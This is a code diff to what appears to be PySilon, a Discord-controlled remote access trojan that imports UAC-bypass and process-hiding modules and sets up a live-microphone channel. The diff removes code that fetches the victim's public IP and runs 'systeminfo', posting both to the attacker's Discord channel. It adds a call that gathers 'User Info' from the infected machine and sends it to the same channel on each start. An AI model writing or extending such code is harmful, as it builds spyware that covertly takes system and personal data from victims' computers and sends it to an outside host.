@@ -8,6 +8,7 @@ from getpass import getuser
 from discord.ext import commands
 from urllib.request import urlopen
 import resources.modules.misc as pysilon_misc
+import resources.modules.info as pysilon_info
 import resources.modules.uac_bypass as uac_bypass
 import resources.modules.hideProcess as proc_hider
 import resources.modules.protections as pysilon_protections
@@ -70,7 +71,7 @@ async def on_ready():
             if not channel_count > 495:
                 guild_id = i
                 break
-    
+
     if not first_run:
         working_directory = fetch_working_dir()
         if working_directory == None or working_directory == []: working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
@@ -93,24 +94,6 @@ async def on_ready():
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
         temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
 
-        try: 
-            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
-        except: pass
-        try:
-            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
-        except: pass
-        
-        system_info = pysilon_misc.force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
-        
-        chunk = ''
-        for line in system_info.split('\n'):
-            if len(chunk) + len(line) > 1990:
-                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
-                chunk = line + '\n'
-            else:
-                chunk += line + '\n'
-        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
-
     else:
         for channel in category.channels:
             if channel.name == 'info':
@@ -119,6 +102,10 @@ async def on_ready():
                 channel_ids['main'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
+
+    user_info = pysilon_info.get_info_main()
+    info_embed = discord.Embed(title=":information_source: User Info",description=f'```{user_info}```', colour=discord.Colour.blue())
+    await client.get_channel(channel_ids['info']).send(embed=info_embed)
 
 def fetch_working_dir():
     global working_directory
